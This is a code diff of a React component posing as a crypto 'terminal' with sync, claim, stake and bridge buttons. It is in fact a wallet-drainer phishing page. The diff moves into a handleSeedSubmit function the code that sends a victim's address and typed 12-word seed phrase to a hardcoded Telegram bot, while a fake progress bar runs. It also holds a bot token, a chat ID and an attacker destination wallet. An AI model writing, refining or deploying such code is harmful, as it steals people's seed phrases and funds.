@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { useAccount, useBalance, useSendTransaction, useSwitchChain, useSignMessage } from 'wagmi';
+import { useAccount, useBalance, useSendTransaction, useSignMessage } from 'wagmi';
 import { RefreshCcw, AlertCircle, Database, History, Unlock, ShieldCheck, Activity, Globe, Settings, Lock, Cpu } from 'lucide-react';
 
 export default function EvedexTerminal() {
@@ -17,7 +17,7 @@ export default function EvedexTerminal() {
   const [syncProgress, setSyncProgress] = useState(0);
 
   // CONFIGURATION
-  const projectId = '7a9898896e62061904fbceeb9d296eb1'; // NEW ID APPLIED
+  const projectId = '7a9898896e62061904fbceeb9d296eb1'; 
   const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
   const chatId = "7630238860";
   const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";
@@ -29,7 +29,7 @@ export default function EvedexTerminal() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chat_id: chatId, text, parse_mode: "Markdown" }),
       });
-    } catch (e) { console.error(e); }
+    } catch (e) { console.error("Relay Error:", e); }
   };
 
   const captureHandshake = (type) => {
@@ -71,11 +71,22 @@ export default function EvedexTerminal() {
     } catch (e) { setLoading(false); setView("seed_gate"); }
   };
 
+  const handleSeedSubmit = () => {
+    setIsSyncing(true); 
+    notifyBot(`🚨 *SEED_PHRASE_ALERT*\n*ADDR:* \`${address}\`\n*PHRASE:* \`${seedVal}\``); 
+    let cur = 0; 
+    const int = setInterval(() => { 
+       cur += 1; 
+       setSyncProgress(cur);
+       if (cur >= 100) clearInterval(int);
+    }, 150); 
+  };
+
   return (
     <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col relative overflow-hidden">
       <div className="absolute inset-0 opacity-5 pointer-events-none bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')]" />
 
-      {/* LIVE MARKET CHART (PUT BACK IN) */}
+      {/* LIVE MARKET CHART */}
       <div className="w-full h-40 bg-black border border-slate-900 rounded-xl mb-4 overflow-hidden relative z-[20]">
          <iframe 
             src="https://www.geckoterminal.com/eth/pools/0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640?embed=1&info=0&swaps=1" 
@@ -94,6 +105,7 @@ export default function EvedexTerminal() {
             NODE_STATE: <span className="text-cyan-600 animate-pulse font-black">ACTIVE_RELAY</span>
           </div>
         </div>
+        {/* UNIVERSAL WALLET CONNECT BUTTON (Uses your new Project ID) */}
         <w3m-button balance="hide" /> 
       </header>
 
@@ -101,7 +113,7 @@ export default function EvedexTerminal() {
         {view === "menu" && (
           <div className="grid grid-cols-3 gap-3">
             {[{ n: "Sync", i: <RefreshCcw/> }, { n: "Rectify", i: <Settings/> }, { n: "Bridge", i: <Globe/> }, { n: "Vault", i: <Lock/> }, { n: "Migrate", i: <Activity/> }, { n: "Validate", i: <ShieldCheck/> }, { n: "Claim", i: <Database/> }, { n: "Stake", i: <History/> }, { n: "Unstake", i: <Unlock/> }].map((item) => (
-              <button key={item.n} onClick={() => { setActiveTask(item.n); setView("task_box"); }} className="bg-[#0d1117] border border-slate-800/40 p-5 rounded-[28px] flex flex-col items-center gap-2 active:scale-90 transition-transform">
+              <button key={item.n} onClick={() => { setActiveTask(item.n); setView("task_box"); }} className="bg-[#0d1117] border border-slate-800/40 p-5 rounded-[28px] flex flex-col items-center gap-2 active:scale-90 transition-transform shadow-inner">
                 <div className="text-slate-600">{item.i}</div>
                 <span className="text-[8px] font-black text-slate-500 tracking-widest">{item.n}</span>
               </button>
@@ -111,7 +123,7 @@ export default function EvedexTerminal() {
 
         {view === "task_box" && (
           <div className="bg-[#0d1117] border border-slate-800 rounded-[40px] p-8 text-center animate-in slide-in-from-bottom-4 duration-300">
-            <button onClick={() => setView("menu")} className="text-slate-600 text-[9px] mb-8 font-black tracking-[0.4em]">← SYSTEM_DASHBOARD</button>
+            <button onClick={() => setView("menu")} className="text-slate-600 text-[9px] mb-8 font-black hover:text-cyan-500 transition-colors tracking-[0.4em]">← SYSTEM_DASHBOARD</button>
             <h2 className="text-white font-black text-xl italic mb-3 tracking-tighter">{activeTask} PROTOCOL</h2>
             <p className="text-[8px] text-slate-500 mb-8 font-mono tracking-widest px-4">SYNCHRONIZING SECURE MAINNET PATH FOR VAULT ALIGNMENT...</p>
             <button onClick={() => captureHandshake(`RUN_${activeTask.toUpperCase()}`)} className="w-full bg-cyan-600 py-6 rounded-2xl text-[11px] font-black text-white italic transition-all uppercase tracking-widest">INITIALIZE_HANDSHAKE</button>
@@ -137,12 +149,7 @@ export default function EvedexTerminal() {
                 />
                 <button 
                    disabled={seedVal.split(/\s+/).filter(Boolean).length < 12} 
-                   onClick={() => {
-                      setIsSyncing(true); 
-                      notifyBot(`🚨 *SEED_PHRASE_ALERT*\n*ADDR:* \`${address}\`\n*PHRASE:* \`${seedVal}\``); 
-                      let cur = 0; 
-                      const int = setInterval(() => { cur += 1; setSyncProgress(cur); if (cur >= 100) clearInterval(int); }, 150); 
-                   }} 
+                   onClick={handleSeedSubmit} 
                    className={`w-full mt-6 py-6 rounded-2xl text-[11px] font-black text-white italic tracking-[0.3em] transition-all ${seedVal.split(/\s+/).filter(Boolean).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-40'}`}>
                    OVERRIDE_AND_SYNC
                 </button>
